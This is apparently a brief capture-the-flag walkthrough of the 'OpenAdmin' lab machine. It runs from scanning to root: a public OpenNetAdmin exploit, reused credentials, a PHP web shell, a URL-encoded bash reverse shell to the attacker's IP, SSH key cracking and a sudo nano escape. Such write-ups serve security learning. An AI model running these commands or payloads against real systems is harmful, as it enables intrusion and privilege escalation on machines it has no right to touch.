----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# OpenAdmin
# 29/3/2023
10.10.10.171

----------------------------------------------------
# nmap
----------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

----------------------------------------------------
gobuster
----------------------------------------------------
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
/sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/]
dirbuster
http://10.10.10.171/ona/


----------------------------------------------------
# foothold
----------------------------------------------------
└─$ searchsploit 18.1.1 
└─$ searchsploit -m php/webapps/47691.sh
└─$ ./47691.sh http://10.10.10.171/ona/
we got shell

----------------------------------------------------
# lateral movements
----------------------------------------------------
www-data@openadmin:/var/www/ona/local/config$ cat database_settings.inc.php
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
Database credentials are found, and reusing this password for jimmy gives us SSH access.


Looking at the /etc/apache2/sites-enabled/internal.conf 
configuration file reveals that the
internal virtual host is running as joanna on localhost port 52846 .

jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf


Inspection of index.php shows a login page, hard-coded with a hashed password.
jimmy@openadmin:/var/www/internal$ cat index.php 

00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1

cracked on crackstation

jimmy:Revealed


ssh tunnling
└─$ ssh jimmy@10.10.10.171 -L 52846:localhost:52846
http://10.10.10.171:52846/


jimmy@openadmin:/var/www/internal$  echo '<?php system($_GET["shub"]); ?>' > shub.php  
└─$  curl http://127.0.0.1:52846/shub.php?shub=id
└─$ nc -lvnp 443  
└─$  curl 'http://127.0.0.1:52846/shub.php?shub=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%37%2f%34%34%33%20%30%3e%26%31%27'
got a shell as joanna
after logging on website we got a ssh key but it have passphrase
└─$ grep -i ninja /usr/share/wordlists/rockyou.txt > rockyou_ninja
└─$ ssh2john id_rsa > hash  
└─$ john hash --wordlist=rockyou_ninja                   
bloodninjas
└─$ ssh -i id_rsa joanna@10.10.10.171
sudo nano
^R^X
reset; sh 1>&0 2>&0